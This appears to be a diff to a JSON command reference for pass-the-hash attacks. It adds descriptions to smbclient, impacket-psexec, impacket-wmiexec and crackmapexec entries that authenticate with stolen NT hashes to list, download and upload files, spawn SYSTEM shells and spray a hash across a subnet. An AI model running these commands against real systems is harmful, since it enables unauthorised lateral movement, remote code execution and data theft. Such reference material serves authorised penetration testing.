@@ -12,42 +12,50 @@
     {
       "command": "smbclient \\\\\\\\<target>\\\\ADMIN$ -U Administrator --pw-nt-hash <nt_hash>",
       "caption": "Connect to ADMIN$ share as local Administrator",
-      "label": "smbclient \\\\\\\\<target>\\\\ADMIN$ -U …"
+      "label": "smbclient \\\\\\\\<target>\\\\ADMIN$ -U …",
+      "description": "Smbclient \\\\\\\\<target>\\\\ADMIN$ -U …. See the command syntax for exact parameters and flags."
     },
     {
       "command": "smbclient \\\\\\\\<target>\\\\<share> -U <domain>/<user> --pw-nt-hash <nt_hash> -c 'ls'",
       "caption": "Non-interactive: list share contents",
-      "label": "smbclient (hash) - list"
+      "label": "smbclient (hash) - list",
+      "description": "Executes an SMB command non-interactively. Useful for scripting file downloads/uploads or share access checks in automated workflows."
     },
     {
       "command": "smbclient \\\\\\\\<target>\\\\<share> -U <user> --pw-nt-hash <nt_hash> -c 'get <file>'",
       "caption": "Download a specific file",
-      "label": "smbclient (hash) - download"
+      "label": "smbclient (hash) - download",
+      "description": "Smbclient (hash) - download. See the command syntax for exact parameters and flags."
     },
     {
       "command": "smbclient \\\\\\\\<target>\\\\<share> -U <user> --pw-nt-hash <nt_hash> -c 'put <local_file> <remote_file>'",
       "caption": "Upload a file to the share",
-      "label": "smbclient (hash) - upload"
+      "label": "smbclient (hash) - upload",
+      "description": "Connects to an SMB share for interactive file transfer. Supports uploading payloads and downloading sensitive files from accessible shares."
     },
     {
       "command": "impacket-psexec -hashes :<nt_hash> <user>@<target>",
       "caption": "PTH with impacket-psexec for code execution (SYSTEM shell)",
-      "label": "impacket-psexec"
+      "label": "impacket-psexec",
+      "description": "Uses Impacket psexec with pass-the-hash authentication - authenticates using an NTLM hash instead of a password. Provides SYSTEM-level shell access without knowing the plaintext password."
     },
     {
       "command": "impacket-wmiexec -hashes :<nt_hash> <user>@<target>",
       "caption": "PTH with WMI execution (less noisy than psexec)",
-      "label": "impacket-wmiexec"
+      "label": "impacket-wmiexec",
+      "description": "Uses Impacket wmiexec for semi-interactive shell access via Windows Management Instrumentation (WMI). Executes commands through the DCOM/WMI service - more stealthy than PsExec as it does not write a service binary to disk."
     },
     {
       "command": "crackmapexec smb <target> -u <user> -H <nt_hash> --shares",
       "caption": "CrackMapExec PTH: enumerate all accessible shares",
-      "label": "cme (hash) - enum shares"
+      "label": "cme (hash) - enum shares",
+      "description": "Uses CrackMapExec to enumerate accessible SMB shares on target hosts. Lists shares and your permission level (READ/WRITE) - identifies data access and potential write targets for payload deployment."
     },
     {
       "command": "crackmapexec smb <cidr> -u <user> -H <nt_hash> -x 'whoami'",
       "caption": "CrackMapExec PTH: spray hash across subnet and run command",
-      "label": "cme (hash) - exec on CIDR"
+      "label": "cme (hash) - exec on CIDR",
+      "description": "Uses CrackMapExec to execute a command on the target via SMB (cmd.exe). Remote command execution with the output returned - useful for quick checks across multiple hosts."
     }
   ],
   "examples": [
